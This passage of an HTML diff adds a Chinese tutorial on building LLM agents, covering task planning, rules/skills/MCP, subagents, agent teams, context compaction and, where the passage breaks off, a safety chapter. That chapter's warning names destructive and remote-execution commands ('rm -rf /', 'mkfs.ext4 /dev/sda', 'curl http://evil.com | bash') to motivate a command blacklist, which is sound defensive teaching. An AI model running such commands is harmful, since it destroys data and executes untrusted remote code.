+      LLM 没有真正的持久记忆。所有"记忆"都是把外部存储的信息搬运到 prompt 中。无论是向量数据库、RAG 还是简单文件，底层都遵循同一模式：<strong>存在哪、怎么找、搬多少</strong>。
+    </div>
+
+    <h3>两种规划范式对比</h3>
+    <div class="diagram">agent-essence.py (ReAct)                  agent-memory.py (Plan-then-Execute)
+
+ 思考 → 行动 → 观察                     规划（全局思考）
+   ↑         │                               │
+   └─────────┘                    ┌──────────┼──────────┐
+                                步骤1      步骤2      步骤3
+                               (内部仍是 ReAct 循环)</div>
+
+    <h3>规划代码：让 LLM 先拆解再执行</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-memory.py（任务规划）</div>
+      </div>
+      <pre><code><span class="kw">def</span> <span class="fn">create_plan</span>(task):
+    response = client.chat.completions.<span class="fn">create</span>(
+        model=MODEL,
+        messages=[
+            {<span class="str">"role"</span>: <span class="str">"system"</span>, <span class="str">"content"</span>: <span class="str">"Break down the task into 3-5 simple, actionable steps. Return as JSON array."</span>},
+            {<span class="str">"role"</span>: <span class="str">"user"</span>,   <span class="str">"content"</span>: <span class="str">f"Task: {task}"</span>}
+        ],
+        response_format={<span class="str">"type"</span>: <span class="str">"json_object"</span>}   <span class="cm"># 强制结构化输出</span>
+    )
+    plan_data = json.<span class="fn">loads</span>(response.choices[<span class="num">0</span>].message.content)
+    steps = plan_data.<span class="fn">get</span>(<span class="str">"steps"</span>, [task])  <span class="cm"># 解析失败则整个任务作为一步</span>
+    <span class="kw">return</span> steps
+
+<span class="cm"># 多步串联：steps 间共享同一个 messages 列表</span>
+<span class="kw">for</span> step <span class="kw">in</span> steps:
+    result, actions, messages = <span class="fn">run_agent_step</span>(step, messages)  <span class="cm"># messages 跨步传递</span>
+    all_results.<span class="fn">append</span>(result)</code></pre>
+    </div>
+
+    <div class="summary-box">
+      <h4>第二篇核心要点</h4>
+      <ul>
+        <li><strong>文件持久化</strong>是最朴素但最能说明原理的记忆方案：追加写入 Markdown 文件</li>
+        <li><strong>滑动窗口截断</strong>（只取最后 50 行）解决记忆文件无限增长问题</li>
+        <li><strong>多步串联</strong>的关键：run_agent_step 接收并返回 messages，步骤 2 能看到步骤 1 的完整轨迹</li>
+        <li><strong>优雅降级</strong>：JSON 解析失败则回退到"整个任务当作一步"，不会崩溃</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第三篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s3">
+  <div class="section-header">
+    <div class="section-num">03</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 3 · Rules · Skills · MCP</div>
+      <h2 class="section-title">Rules、Skills 与 MCP 机制</h2>
+      <div class="section-subtitle">扩展 Agent 的知识边界与工具能力：从硬编码到可插拔</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout">
+      <div class="callout-title">本篇新增能力</div>
+      <strong>Rules</strong>（行为约束文件）+ <strong>Skills</strong>（可插拔技能注册）+ <strong>MCP</strong>（工具扩展协议）+ <strong>Plan-as-Tool</strong>（规划工具化）
+    </div>
+
+    <h3>能力维度：prompt 维度 vs tools 维度</h3>
+    <div class="diagram">Agent 的能力由两个正交维度定义：
+
+  prompt 维度（知道什么）           tools 维度（能做什么）
+  ┌──────────────────┐             ┌──────────────────┐
+  │  Rules           │             │  base_tools       │
+  │  （行为约束）      │             │  （7 个基础工具）   │
+  ├──────────────────┤             ├──────────────────┤
+  │  Skills          │             │  MCP tools        │
+  │  （领域知识）      │             │  （动态加载 N 个）  │
+  ├──────────────────┤             └──────────────────┘
+  │  Memory          │
+  │  （历史记忆）      │
+  └──────────────────┘
+
+两者独立变化、自由组合，构成 Agent 的完整能力空间</div>
+
+    <h3>Rules：教 Agent "做人的规矩"</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Markdown · .agent/rules/code-style.md（示例）</div>
+      </div>
+      <pre><code><span class="cm"># 代码规范</span>
+- 使用 Python 3.10+ 语法
+- 所有函数必须有 docstring
+- 变量命名使用 snake_case
+- 不要使用 print 调试，使用 logging 模块
+
+<span class="cm"># 安全规范</span>
+- 永远不要执行 rm -rf / 或类似的危险命令
+- 修改文件前先备份
+- 不要修改 .env 文件中的密钥</code></pre>
+    </div>
+    <div class="callout">
+      Rules 是<strong>项目级的 system prompt 扩展</strong>。在 OpenClaw/Claude Code 中对应 <code>CLAUDE.md</code> 文件，在 Cursor 中是 <code>.cursorrules</code>，在 Copilot 中是 <code>.github/copilot-instructions.md</code>。名字不同，本质一样：用声明式文件定制 Agent 的行为边界。
+    </div>
+
+    <h3>Skills vs Rules 对比</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th>维度</th><th>Rules</th><th>Skills</th></tr>
+        <tr><td>文件格式</td><td>Markdown</td><td>JSON</td></tr>
+        <tr><td>作用</td><td>约束行为（"不要做什么"）</td><td>提供能力（"可以怎么做"）</td></tr>
+        <tr><td>类比</td><td>公司规章制度</td><td>员工培训手册</td></tr>
+        <tr><td>注入方式</td><td>全文注入</td><td>名称 + 描述摘要</td></tr>
+      </table>
+    </div>
+
+    <h3>MCP：AI 世界的 USB 接口</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">JSON · .agent/mcp.json（配置示例）</div>
+      </div>
+      <pre><code>{
+  <span class="key">"mcpServers"</span>: {
+    <span class="key">"filesystem"</span>: {
+      <span class="key">"disabled"</span>: <span class="kw">false</span>,
+      <span class="key">"tools"</span>: [{
+        <span class="key">"name"</span>: <span class="str">"list_directory"</span>,
+        <span class="key">"description"</span>: <span class="str">"List contents of a directory with metadata"</span>,
+        <span class="key">"parameters"</span>: {
+          <span class="key">"type"</span>: <span class="str">"object"</span>,
+          <span class="key">"properties"</span>: {<span class="key">"path"</span>: {<span class="key">"type"</span>: <span class="str">"string"</span>}},
+          <span class="key">"required"</span>: [<span class="str">"path"</span>]
+        }
+      }]
+    }
+  }
+}
+
+<span class="cm">// 一行代码完成集成：MCP 工具与基础工具无缝合并</span>
+all_tools = base_tools + mcp_tools</code></pre>
+    </div>
+
+    <div class="diagram">没有 MCP 的世界:                 有 MCP 的世界:
+
+Agent A        Agent B           MCP Server: Slack   MCP Server: GitHub
+├── Slack(自写)  ├── Slack(自写)        │                   │
+├── GitHub(自写) ├── Jira(自写)         └────── 标准协议 ───┘
+└── DB(自写)    └── DB(自写)                       │
+                                      ┌────────────┼────────────┐
+每个 Agent 各写各的                  Agent A    Agent B    Agent C
+N × M 的工作量                      工具实现一次，全部共享
+                                      N + M 的工作量</div>
+
+    <h3>完整 system prompt 构建层次</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-skills-mcp.py（system prompt 组装）</div>
+      </div>
+      <pre><code><span class="cm"># 从文件系统加载所有外部配置</span>
+memory    = <span class="fn">load_memory</span>()        <span class="cm"># 历史记忆</span>
+rules     = <span class="fn">load_rules</span>()         <span class="cm"># 行为规则 (.agent/rules/*.md)</span>
+skills    = <span class="fn">load_skills</span>()        <span class="cm"># 技能注册 (.agent/skills/*.json)</span>
+mcp_tools = <span class="fn">load_mcp_tools</span>()     <span class="cm"># MCP 工具  (.agent/mcp.json)</span>
+
+<span class="cm"># 最终 system prompt = 基础指令 + Rules + Skills + Memory</span>
+context_parts = [<span class="str">"You are a helpful assistant..."</span>]
+<span class="kw">if</span> rules:   context_parts.<span class="fn">append</span>(<span class="str">f"\n# Rules\n{rules}"</span>)
+<span class="kw">if</span> skills:  context_parts.<span class="fn">append</span>(<span class="str">f"\n# Skills\n..."</span>)
+<span class="kw">if</span> memory:  context_parts.<span class="fn">append</span>(<span class="str">f"\n# Previous Context\n{memory}"</span>)
+
+<span class="cm"># 工具列表 = 基础工具 + MCP 工具</span>
+all_tools = base_tools + mcp_tools</code></pre>
+    </div>
+
+    <div class="summary-box">
+      <h4>第三篇核心要点</h4>
+      <ul>
+        <li><strong>edit 工具的唯一性约束</strong>：old_string 必须恰好出现一次，迫使 LLM 先确认上下文再编辑</li>
+        <li><strong>Plan-as-Tool</strong>：把规划注册为工具，LLM 遇到复杂任务可自主触发，无需用户手动 --plan</li>
+        <li><strong>MCP 的精髓</strong>：工具定义与工具实现分离，all_tools = base_tools + mcp_tools 一行完成集成</li>
+        <li><strong>防无限递归</strong>：执行规划步骤时排除 plan 工具本身</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第四篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s4">
+  <div class="section-header">
+    <div class="section-num">04</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 4 · SubAgent</div>
+      <h2 class="section-title">给 Agent 找个帮手——最简 SubAgent</h2>
+      <div class="section-subtitle">核心新增仅 30 行代码：一次性临时工，独立上下文，专业角色</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout">
+      <div class="callout-title">SubAgent 的本质</div>
+      SubAgent 是<strong>一次性的</strong>。生命周期：生成 → 接收任务 → 干活（可以调用工具）→ 返回结果摘要 → 消亡。没有持久身份，没有跨调用记忆。它解决的是<strong>单次任务内的分工问题</strong>。
+    </div>
+
+    <h3>生活类比：项目经理 + 专人</h3>
+    <div class="diagram">之前（一个人干所有活）:
+  老板 → "小张，你把前端后端数据库全搞定"
+         小张（一个人扛所有，上下文越来越乱）
+
+现在（项目经理 + 专人）:
+  老板 → 项目经理（主 Agent）
+              │
+              ├── "后端用 FastAPI" → 后端工程师（SubAgent A）
+              ├── "前端用 React"   → 前端工程师（SubAgent B）
+              └── "验证能跑通"     → 测试工程师（SubAgent C）
+
+  每人只管自己的事，干完把结果交给项目经理汇总。
+  下次找"后端工程师"，是一个全新的、失忆的临时工。</div>
+
+    <h3>SubAgent 的实现：核心 30 行</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-subagent.py（SubAgent 完整实现）</div>
+      </div>
+      <pre><code><span class="cm"># ① 工具定义：告诉 LLM 有这个能力</span>
+{
+    <span class="str">"name"</span>: <span class="str">"subagent"</span>,
+    <span class="str">"description"</span>: <span class="str">"Delegate a task to a specialized sub-agent."</span>,
+    <span class="str">"parameters"</span>: {
+        <span class="str">"role"</span>: {<span class="str">"type"</span>: <span class="str">"string"</span>, <span class="str">"description"</span>: <span class="str">"The sub-agent's specialty"</span>},
+        <span class="str">"task"</span>: {<span class="str">"type"</span>: <span class="str">"string"</span>, <span class="str">"description"</span>: <span class="str">"The specific task to delegate"</span>}
+    }
+}
+
+<span class="cm"># ② 工具实现：启动独立 Agent 循环</span>
+<span class="kw">def</span> <span class="fn">subagent</span>(role, task):
+    <span class="cm"># 关键 1：独立的 messages，独立的 system prompt</span>
+    sub_messages = [
+        {<span class="str">"role"</span>: <span class="str">"system"</span>, <span class="str">"content"</span>: <span class="str">f"You are a {role}. Be concise and focused."</span>},
+        {<span class="str">"role"</span>: <span class="str">"user"</span>,   <span class="str">"content"</span>: task}
+    ]
+    <span class="cm"># 关键 2：排除 subagent 自身，防止无限递归</span>
+    sub_tools = [t <span class="kw">for</span> t <span class="kw">in</span> tools <span class="kw">if</span> t[<span class="str">"function"</span>][<span class="str">"name"</span>] != <span class="str">"subagent"</span>]
+
+    <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">10</span>):
+        response = client.chat.completions.<span class="fn">create</span>(
+            model=MODEL, messages=sub_messages, tools=sub_tools
+        )
+        message = response.choices[<span class="num">0</span>].message
+        sub_messages.<span class="fn">append</span>(message)
+
+        <span class="kw">if not</span> message.tool_calls:
+            <span class="kw">return</span> message.content   <span class="cm"># 返回后 sub_messages 被垃圾回收</span>
+
+        <span class="kw">for</span> tc <span class="kw">in</span> message.tool_calls:
+            result = available_functions[tc.function.name](**<span class="fn">json.loads</span>(tc.function.arguments))
+            sub_messages.<span class="fn">append</span>({<span class="str">"role"</span>: <span class="str">"tool"</span>, <span class="str">"tool_call_id"</span>: tc.id, <span class="str">"content"</span>: result})
+
+<span class="cm"># ③ 注册到路由表（就这一行）</span>
+available_functions[<span class="str">"subagent"</span>] = subagent</code></pre>
+    </div>
+
+    <h3>SubAgent 的调用链路</h3>
+    <div class="diagram">用户: "创建一个 TODO 应用，包含 Python 后端和 HTML 前端"
+  │
+  ▼ 主 Agent 循环启动
+  │
+  ① 发送 tools 列表（含 subagent 工具）给 LLM
+  │
+  ② LLM 决定委派，返回:
+     {"tool_calls": [{"name": "subagent", "arguments": {"role": "Python backend developer", ...}}]}
+  │
+  ③ 通用调度代码: available_functions["subagent"](**args)
+     ↳ 和调用 bash、read 完全一样的路径！
+  │
+  ④ subagent() 内部启动全新 Agent 循环
+     - 独立 system prompt: "You are a Python backend developer."
+     - 独立 messages（主 Agent 的历史对它不可见）
+     - 可使用 read/write/bash 等工具
+     - 返回结果后消亡，sub_messages 被回收
+  │
+  ⑤ 结果返回给主 Agent，继续派出前端 SubAgent...</div>
+
+    <div class="callout green">
+      <div class="callout-title">🎯 核心设计思想</div>
+      <strong>控制流在 LLM 手里，不在代码里。</strong>没有任何地方主动调用 subagent()——代码只提供能力（注册工具），LLM 决定何时使用。这是 Agent 和传统程序的根本区别。
+    </div>
+
+    <h3>SubAgent vs Plan：什么时候用哪个？</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th>维度</th><th>Plan（第二篇）</th><th>SubAgent（本篇）</th></tr>
+        <tr><td>上下文</td><td>所有步骤<strong>共享</strong> messages</td><td>每个 SubAgent <strong>独立</strong> messages</td></tr>
+        <tr><td>身份</td><td>同一个 Agent，同一角色</td><td>每个 SubAgent <strong>不同专业角色</strong></td></tr>
+        <tr><td>适合场景</td><td>步骤之间有依赖关系</td><td>子任务之间相对独立</td></tr>
+        <tr><td>类比</td><td>一个人按步骤做事</td><td>叫了个跑腿临时工，干完就走</td></tr>
+      </table>
+    </div>
+
+    <div class="summary-box">
+      <h4>第四篇核心要点</h4>
+      <ul>
+        <li><strong>subagent 就是一个工具</strong>：和 bash、read 走完全相同的调度路径</li>
+        <li><strong>独立 messages</strong>：SubAgent 只知道自己的角色和任务，不受主 Agent 历史干扰</li>
+        <li><strong>一次性生命周期</strong>：函数返回后 sub_messages 被垃圾回收，下次调用是全新实例</li>
+        <li><strong>排除自身防递归</strong>：sub_tools 过滤掉 subagent，一行代码解决无限嵌套</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第五篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s5">
+  <div class="section-header">
+    <div class="section-num">05</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 5 · Multi-Agent Teams</div>
+      <h2 class="section-title">从临时工到正式团队</h2>
+      <div class="section-subtitle">Agent 类 + Team 类：持久记忆、身份管理、通信通道</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout">
+      <div class="callout-title">本篇核心进化</div>
+      从 SubAgent 的"一次性临时工"升级为正式团队：<strong>持久记忆</strong>（Agent 对象存活）+ <strong>身份管理</strong>（有名字有角色）+ <strong>通信通道</strong>（收件箱机制）
+    </div>
+
+    <h3>临时工 vs 正式员工</h3>
+    <div class="table-wrap">
+      <table>
+        <tr><th></th><th>SubAgent（临时工）</th><th>Teams Agent（正式员工）</th></tr>
+        <tr><td>有名字吗？</td><td>❌ 只有临时角色描述</td><td>✅ 有名字（alice）、有固定角色</td></tr>
+        <tr><td>记得上次做了什么？</td><td>❌ 每次调用都失忆</td><td>✅ 多次交互间记忆持续累积</td></tr>
+        <tr><td>能收到同事消息？</td><td>❌ 互相看不到</td><td>✅ 有收件箱，能收消息</td></tr>
+        <tr><td>什么时候消失？</td><td>函数返回就没了</td><td>团队解散才消失</td></tr>
+      </table>
+    </div>
+
+    <h3>关键变化：局部变量 → 实例属性</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · 对比（SubAgent vs Teams Agent）</div>
+      </div>
+      <pre><code><span class="cm"># SubAgent（第四篇）—— 局部变量，函数返回即消亡</span>
+<span class="kw">def</span> <span class="fn">subagent</span>(role, task):
+    sub_messages = [...]   <span class="cm"># 🔴 生命周期 = 这个函数调用</span>
+    <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">10</span>): ...
+    <span class="kw">return</span> result          <span class="cm"># sub_messages 被垃圾回收，一切归零</span>
+
+
+<span class="cm"># Teams Agent（本篇）—— 实例属性，对象存活就一直在</span>
+<span class="kw">class</span> <span class="cls">Agent</span>:
+    <span class="kw">def</span> <span class="fn">__init__</span>(self, name, role):
+        self.name = name
+        self.role = role
+        self.inbox = []                <span class="cm"># 通信：收件箱</span>
+        self.messages = [              <span class="cm"># 🟢 生命周期 = Agent 对象的生命周期</span>
+            {<span class="str">"role"</span>: <span class="str">"system"</span>, <span class="str">"content"</span>: <span class="str">f"You are {name}, a {role}."</span>}
+        ]
+
+    <span class="kw">def</span> <span class="fn">chat</span>(self, task):
+        <span class="cm"># Step 1：先读收件箱</span>
+        <span class="kw">if</span> self.inbox:
+            mail = <span class="str">"\n"</span>.<span class="fn">join</span>(<span class="str">f"[来自 {m['from']}]: {m['content']}"</span> <span class="kw">for</span> m <span class="kw">in</span> self.inbox)
+            self.messages.<span class="fn">append</span>({<span class="str">"role"</span>: <span class="str">"user"</span>, <span class="str">"content"</span>: <span class="str">f"你收到了消息:\n{mail}"</span>})
+            <span class="cm"># ...LLM 消化 inbox...</span>
+            self.inbox.<span class="fn">clear</span>()
+        <span class="cm"># Step 2：执行本次任务（和第一篇循环一模一样）</span>
+        self.messages.<span class="fn">append</span>({<span class="str">"role"</span>: <span class="str">"user"</span>, <span class="str">"content"</span>: task})
+        <span class="cm"># ... Agent 循环 ...</span>
+
+    <span class="kw">def</span> <span class="fn">receive</span>(self, sender, message):
+        self.inbox.<span class="fn">append</span>({<span class="str">"from"</span>: sender, <span class="str">"content"</span>: message})</code></pre>
+    </div>
+
+    <h3>Team 类：生命周期与通信管理</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-teams.py（Team 类）</div>
+      </div>
+      <pre><code><span class="kw">class</span> <span class="cls">Team</span>:
+    <span class="kw">def</span> <span class="fn">hire</span>(self, name, role):    <span class="cm"># 招募：创建持久 Agent</span>
+        agent = <span class="cls">Agent</span>(name, role)
+        self.agents[name] = agent
+        <span class="kw">return</span> agent
+
+    <span class="kw">def</span> <span class="fn">send</span>(self, from_name, to_name, message):   <span class="cm"># 点对点通信</span>
+        self.agents[to_name].<span class="fn">receive</span>(from_name, message)
+
+    <span class="kw">def</span> <span class="fn">broadcast</span>(self, from_name, message):        <span class="cm"># 广播给所有人</span>
+        <span class="kw">for</span> name, agent <span class="kw">in</span> self.agents.items():
+            <span class="kw">if</span> name != from_name:
+                agent.<span class="fn">receive</span>(from_name, message)
+
+    <span class="kw">def</span> <span class="fn">disband</span>(self):                              <span class="cm"># 解散团队</span>
+        self.agents.<span class="fn">clear</span>()</code></pre>
+    </div>
+
+    <h3>协作流程示例</h3>
+    <div class="diagram">团队任务: "创建 TODO 应用（FastAPI 后端 + HTML 前端）"
+  │
+  ▼ plan_team() → LLM 生成团队角色
+  │
+  组建: alice(后端) · bob(前端) · carol(测试)
+  │
+  alice.chat("用 FastAPI 创建后端 API")
+  → write(app.py) ...
+  → 完成后: team.broadcast("alice", "后端完成，接口: GET/POST/DELETE /todos")
+  │
+  bob.chat("创建 HTML 前端")
+  → inbox 里有 alice 的广播，知道 API 格式
+  → write(index.html) ...
+  → 完成后: team.broadcast("bob", "前端完成，调用了后端接口")
+  │
+  carol.chat("验证前后端能正常工作")  ← 第 1 次调用
+  carol.chat("请做最终审查")          ← 第 2 次调用（carol 记得第 1 次的结果！）
+  │
+  team.disband()  ← 所有 Agent 消亡</div>
+
+    <div class="callout green">
+      <div class="callout-title">💡 一个变化，一次进化</div>
+      从第四篇到第五篇，代码层面的变化只有一个：<strong>messages 从函数局部变量变成了类实例属性</strong>。但这一个变化，让 Agent 从"用完即弃的临时工"进化为了"有记忆、有身份、能协作的团队成员"。
+    </div>
+
+    <div class="summary-box">
+      <h4>第五篇核心要点</h4>
+      <ul>
+        <li><strong>持久记忆的实现</strong>：self.messages 随 Agent 对象存活，多次 chat() 调用历史持续累积</li>
+        <li><strong>收件箱机制</strong>：每次 chat() 开始前先消化 inbox，Agent 知道队友的最新进展</li>
+        <li><strong>广播 vs 点对点</strong>：broadcast 实现信息共享，send 实现精准传递</li>
+        <li><strong>数据放在哪里决定生命周期</strong>：局部变量 = 临时工，实例属性 = 正式员工</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第六篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s6">
+  <div class="section-header">
+    <div class="section-num">06</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 6 · Context Compaction</div>
+      <h2 class="section-title">Agent 的一次断舍离——上下文压缩</h2>
+      <div class="section-subtitle">30 行代码解决"自我窒息"问题：记住要点，忘掉细节，轻装上阵</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout red">
+      <div class="callout-title">⚠️ 问题：messages 会无限增长</div>
+      每轮循环 messages += [LLM回复, 工具结果]，稍微复杂的任务（读几个大文件、运行几次 grep）就会填满 context window，API 报错 <strong>context_length_exceeded</strong>，Agent 半途而废。
+    </div>
+
+    <h3>压缩原理：三刀切，用 LLM 做摘要</h3>
+    <div class="diagram">压缩前的 messages（20+ 条，快爆了）:
+┌─────────┐
+│ system  │ ← 永远保留（不动）
+├─────────┤
+│ user    │ ← 最初的任务
+│ assist  │ ← 调用了 bash
+│ tool    │ ← bash 输出 200 行文件列表
+│ assist  │ ← 调用了 read_file              ─┐
+│ tool    │ ← 文件内容 500 行                │ 这些旧消息
+│ assist  │ ← 调用了 grep                    │ 交给 LLM 做摘要
+│ tool    │ ← grep 结果 300 行              ─┘
+│ ...     │
+│ assist  │ ← 准备写文件                    ─┐
+│ tool    │ ← 写入成功                       │ 最近 6 条
+│ assist  │ ← 调用 read 验证                 │ 保留原样
+│ tool    │ ← 文件内容                       │ （不压缩）
+└─────────┘                                 ─┘
+
+        ↓ compact_messages() ↓
+
+压缩后（9 条，清爽了）:
+┌─────────┐
+│ system  │
+├─────────┤
+│ user    │ "之前的摘要：找到了 42 个 Python 文件，统计了行数..."
+│ assist  │ "明白，我继续。"
+├─────────┤
+│ ...最近 6 条（完整保留）...
+└─────────┘</div>
+
+    <h3>压缩函数实现</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-compact.py（完整压缩函数）</div>
+      </div>
+      <pre><code>COMPACT_THRESHOLD = <span class="num">20</span>   <span class="cm"># 超过 20 条触发压缩</span>
+KEEP_RECENT       = <span class="num">6</span>    <span class="cm"># 保留最近 6 条不压缩</span>
+
+<span class="kw">def</span> <span class="fn">compact_messages</span>(messages):
+    <span class="kw">if</span> <span class="fn">len</span>(messages) <= COMPACT_THRESHOLD:
+        <span class="kw">return</span> messages          <span class="cm"># 没超阈值，原样返回（零开销）</span>
+
+    <span class="cm"># 三刀切</span>
+    system_msg      = messages[<span class="num">0</span>]               <span class="cm"># 永远保留</span>
+    old_messages    = messages[<span class="num">1</span>:-KEEP_RECENT]   <span class="cm"># 要被压缩</span>
+    recent_messages = messages[-KEEP_RECENT:]    <span class="cm"># 保留原样</span>
+
+    <span class="cm"># 把旧消息拼成文本</span>
+    old_text = <span class="str">""</span>
+    <span class="kw">for</span> msg <span class="kw">in</span> old_messages:
+        role    = msg.get(<span class="str">"role"</span>, <span class="str">"unknown"</span>)
+        content = msg.get(<span class="str">"content"</span>, <span class="str">""</span>)
+        <span class="kw">if</span> content:
+            old_text += <span class="str">f"[{role}]: {content}\n"</span>
+
+    <span class="cm"># 用 LLM 生成摘要（套娃：用 LLM 压缩 LLM 的历史）</span>
+    summary_response = client.chat.completions.<span class="fn">create</span>(
+        model=MODEL,
+        messages=[
+            {<span class="str">"role"</span>: <span class="str">"system"</span>, <span class="str">"content"</span>: <span class="str">"Summarize the conversation. Keep all important facts, file paths, command results, and decisions. Be concise but don't lose critical details."</span>},
+            {<span class="str">"role"</span>: <span class="str">"user"</span>,   <span class="str">"content"</span>: old_text}
+        ]
+    )
+    summary = summary_response.choices[<span class="num">0</span>].message.content
+
+    <span class="cm"># 重新组装：system + 摘要对话 + 最近 N 条</span>
+    <span class="kw">return</span> [
+        system_msg,
+        {<span class="str">"role"</span>: <span class="str">"user"</span>,      <span class="str">"content"</span>: <span class="str">f"[Previous conversation summary]: {summary}"</span>},
+        {<span class="str">"role"</span>: <span class="str">"assistant"</span>, <span class="str">"content"</span>: <span class="str">"Understood. Let me continue."</span>},
+        *recent_messages
+    ]
+
+<span class="cm"># 在 Agent 循环中，每轮开始前调用一次（就加这一行）</span>
+<span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(max_iterations):
+    messages = <span class="fn">compact_messages</span>(messages)   <span class="cm"># ← 就这一行</span>
+    response = client.chat.completions.<span class="fn">create</span>(...)</code></pre>
+    </div>
+
+    <h3>messages 数量变化：锯齿波模式</h3>
+    <div class="progress-section">
+      <div class="progress-label"><span>轮次 1-5（增长）</span><span>count: 2→10</span></div>
+      <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
+      <div class="progress-label"><span>轮次 6（压缩触发）</span><span>count: 10→9</span></div>
+      <div class="progress-bar"><div class="progress-fill" style="width:90%;background:linear-gradient(90deg,var(--orange),var(--red))"></div></div>
+      <div class="progress-label"><span>轮次 7-9（再次增长）</span><span>count: 9→11</span></div>
+      <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
+      <div class="progress-label"><span>轮次 10（再次压缩）</span><span>count: 11→9</span></div>
+      <div class="progress-bar"><div class="progress-fill" style="width:90%;background:linear-gradient(90deg,var(--orange),var(--red))"></div></div>
+    </div>
+    <p>messages 数量像<strong>锯齿波</strong>：涨到阈值 → 压缩回去 → 继续涨 → 再压缩。<strong>Agent 可以无限工作下去，永远不会撑爆 context window</strong>。</p>
+
+    <div class="callout">
+      <div class="callout-title">压缩会丢信息吗？</div>
+      会丢<strong>细节</strong>，不丢<strong>要点</strong>。20 个具体文件名可能被压缩为"在 src/ 和 tests/ 下找到 20 个 Python 文件"。丢失的细节，Agent 可以再次调用工具获取。就像人类工作：记得大概情况，细节不记得就再查一遍。
+    </div>
+
+    <div class="summary-box">
+      <h4>第六篇核心要点</h4>
+      <ul>
+        <li><strong>触发机制</strong>：消息条数超阈值才压缩，没超则原样返回（零开销）</li>
+        <li><strong>system prompt 单独保留</strong>：它包含 Agent 的基础设定，压缩进摘要会丢失"你是谁"</li>
+        <li><strong>最近 N 条不压缩</strong>：当前正在进行的操作需要精确上下文</li>
+        <li><strong>前六篇的关系</strong>：前五篇是"加能力"，第六篇是解决加完能力后的"副作用"</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- 第七篇 -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<section class="section" id="s7">
+  <div class="section-header">
+    <div class="section-num">07</div>
+    <div class="section-title-wrap">
+      <div class="section-eyebrow">Chapter 7 · Safety &amp; Permissions</div>
+      <h2 class="section-title">Agent 执行 rm -rf / 怎么办？</h2>
+      <div class="section-subtitle">三道安全防线：从"裸奔"到"有保险的" Agent</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="callout red">
+      <div class="callout-title">⚠️ Agent 手里有一把没有保险的枪</div>
+      execute_bash 可以执行<strong>任意</strong> shell 命令——包括 <code>rm -rf /</code>、<code>mkfs.ext4 /dev/sda</code>、<code>curl http://evil.com | bash</code>。LLM 会因为理解错误、幻觉、或 prompt 注入而执行危险操作。
+    </div>
+
+    <h3>三道防线的设计</h3>
+    <div class="diagram">LLM 输出一条命令
+  │
+  ▼
+防线 1: 命令黑名单（正则匹配）
+  │ "rm -rf /" → 🚫 直接拦截，不问用户，返回拦截信息给 LLM
+  │ "ls -la"   → ✅ 通过
+  ▼
+防线 2: 用户确认（人机协作）
+  │ "find . -name '*.py'" → 展示给用户
+  │   [Y] 放行    [N] 跳过    [Q] 终止 Agent
+  ▼
+防线 3: 输出截断（防爆 context）
+  │ 输出 10000 行 → 截断为首尾各 2500 字符
+  │ 输出 10 行    → 原样返回
+  ▼
+结果返回给 LLM</div>
+
+    <h3>防线 1：命令黑名单</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></div>
+        <div class="code-lang">Python · agent-safe.py（黑名单实现）</div>
+      </div>
